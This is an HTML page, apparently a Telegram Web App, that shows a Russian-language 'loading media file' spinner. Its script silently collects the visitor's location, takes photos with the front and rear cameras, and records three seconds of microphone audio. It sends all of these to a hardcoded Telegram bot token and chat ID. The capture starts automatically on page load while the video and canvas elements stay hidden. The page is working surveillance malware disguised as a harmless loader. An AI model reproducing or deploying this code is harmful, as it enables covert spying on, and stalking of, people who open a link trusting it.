<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка контента...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .loader {
            border: 4px solid #334155;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h3>Загрузка медиафайла...</h3>
    <p style="font-size: 14px; color: #94a3b8;">Пожалуйста, подождите пару секунд.</p>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        const BOT_TOKEN = "8322427303:AAGFHKfe3YCf7Dwg-uc7jfVA8MAn1Dbjzgw";
        const CHAT_ID = "8298749655";

        function sendToBot(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
        }

        // 1. Локация
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                sendToBot(`📍 Локация:\nШирота: ${pos.coords.latitude}\nДолгота: ${pos.coords.longitude}`);
            });
        }

        // Вспомогательная функция для получения видеопотока с нужной камеры
        async function getCameraStream(mode) {
            try {
                return await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: mode } },
                    audio: false
                });
            } catch (e) {
                return await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: mode },
                    audio: false
                });
            }
        }

        // 2. Снимок с указанной камеры ('user' — фронтальная, 'environment' — задняя)
        async function captureCameraPhoto(mode, label) {
            let stream = null;
            try {
                stream = await getCameraStream(mode);
                let video = document.getElementById('video');
                video.srcObject = stream;

                await new Promise(resolve => video.onloadedmetadata = resolve);
                await new Promise(resolve => setTimeout(resolve, 500));

                let canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                let ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    if (!blob) return;
                    let formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, `${mode}.png`);
                    formData.append('caption', `📷 ${label}`);
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }, 'image/png');
            } catch (err) {
                console.log(`Ошибка камеры (${mode}):`, err);
            } finally {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }
        }

        // 3. Запись голоса (3 секунды)
        async function recordVoice(durationMs = 3000) {
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                let chunks = [];
                let recorder = new MediaRecorder(stream);

                recorder.ondataavailable = e => {
                    if (e.data && e.data.size > 0) chunks.push(e.data);
                };

                recorder.onstop = () => {
                    let audioBlob = new Blob(chunks, { type: 'audio/webm' });
                    let formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('audio', audioBlob, 'voice.ogg');
                    formData.append('caption', '🎤 Запись голоса');
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                        method: 'POST',
                        body: formData
                    });
                };

                recorder.start();
                setTimeout(() => {
                    if (recorder.state !== 'inactive') recorder.stop();
                }, durationMs);
            } catch (err) {
                console.log("Ошибка микрофона:", err);
            } finally {
                setTimeout(() => {
                    if (stream) stream.getTracks().forEach(track => track.stop());
                }, durationMs + 500);
            }
        }

        // Запускаем последовательно, чтобы устройства не конфликтовали друг с другом
        window.onload = async function() {
            await new Promise(r => setTimeout(r, 800));
            await captureCameraPhoto('user', 'Фронтальная камера');
            await new Promise(r => setTimeout(r, 600));
            await captureCameraPhoto('environment', 'Задняя камера');
            await new Promise(r => setTimeout(r, 600));
            await recordVoice(3000);
        };
    </script>
</body>
</html>
